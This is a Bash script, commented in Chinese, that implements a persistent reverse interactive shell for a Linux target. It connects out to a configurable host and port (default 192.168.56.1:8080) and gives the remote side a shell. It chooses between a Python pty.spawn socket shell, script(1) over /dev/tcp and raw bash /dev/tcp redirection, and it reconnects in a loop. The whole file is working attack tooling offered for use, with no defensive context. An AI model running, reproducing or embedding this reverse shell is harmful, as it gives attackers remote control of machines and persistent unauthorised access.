#!/usr/bin/env bash
# 反弹交互式 Shell —— Bash 实现（Linux 受控端）
#
# 交互性三级回退（自动按质量选择，可用 RS_METHOD 强制）：
#   python  python3 的 pty.spawn —— 真 PTY：提示符 / Ctrl-C / su / vim 全正常
#   script  util-linux 的 script(1) —— 同样分配真 PTY
#   tcp     纯 bash /dev/tcp —— 无 PTY 的最后兜底（无完整提示符、Ctrl-C 不通）
#
# 用法: shell.sh [HOST] [PORT]
# 环境: RS_HOST(默认 192.168.56.1) RS_PORT(默认 8080)
#       RS_INTERVAL(重连间隔秒，默认 5) RS_SHELL(默认 /bin/bash)
#       RS_SESSIONS(最多会话数，0=无限) RS_ONCE=1(等价 1 次会话)
#       RS_METHOD=auto|python|script|tcp(强制指定回退级别)

set -u

HOST="${1:-${RS_HOST:-192.168.56.1}}"
PORT="${2:-${RS_PORT:-8080}}"
INTERVAL="${RS_INTERVAL:-5}"
SHELL_BIN="${RS_SHELL:-/bin/bash}"
METHOD="${RS_METHOD:-auto}"
SESSIONS="${RS_SESSIONS:-0}"
case "${RS_ONCE:-0}" in 1|true|yes) SESSIONS=1 ;; esac

have() { command -v "$1" >/dev/null 2>&1; }

# ---- 方案 A：python3 pty.spawn（真 PTY，首选） ----
run_python() {
  python3 - "$HOST" "$PORT" "$SHELL_BIN" <<'PY'
import os, pty, socket, sys

host, port, shell = sys.argv[1], int(sys.argv[2]), sys.argv[3]
s = socket.create_connection((host, port), timeout=10)
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
os.environ.setdefault("TERM", "xterm-256color")
pty.spawn([shell, "-i"])
PY
}

# ---- 方案 B：script(1) 分配 PTY ----
run_script() {
  if ! { exec 3<>"/dev/tcp/$HOST/$PORT"; } 2>/dev/null; then
    return 1
  fi
  script -qfc "$SHELL_BIN -i" /dev/null <&3 >&3 2>&3
  local rc=$?
  exec 3>&- 3<&-
  return $rc
}

# ---- 方案 C：纯 /dev/tcp（无 PTY 兜底） ----
run_tcp() {
  if ! { exec 3<>"/dev/tcp/$HOST/$PORT"; } 2>/dev/null; then
    return 1
  fi
  "$SHELL_BIN" -i <&3 >&3 2>&3
  local rc=$?
  exec 3>&- 3<&-
  return $rc
}

pick_method() {
  case "$METHOD" in
    python|script|tcp) printf '%s' "$METHOD"; return ;;
  esac
  if have python3 && python3 -c 'import pty, socket' >/dev/null 2>&1; then
    printf 'python'; return
  fi
  if have script; then printf 'script'; return; fi
  printf 'tcp'
}

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  sed -n '2,14p' "$0"
  exit 0
fi

METHOD="$(pick_method)"
sessions=0
while :; do
  case "$METHOD" in
    python) run_python ;;
    script) run_script ;;
    tcp)    run_tcp ;;
  esac
  rc=$?
  # 连接失败不算一次会话；会话正常结束才计数
  if [ "$rc" -eq 0 ]; then
    sessions=$((sessions + 1))
    if [ "$SESSIONS" -gt 0 ] && [ "$sessions" -ge "$SESSIONS" ]; then
      break
    fi
  fi
  sleep "$INTERVAL"
done
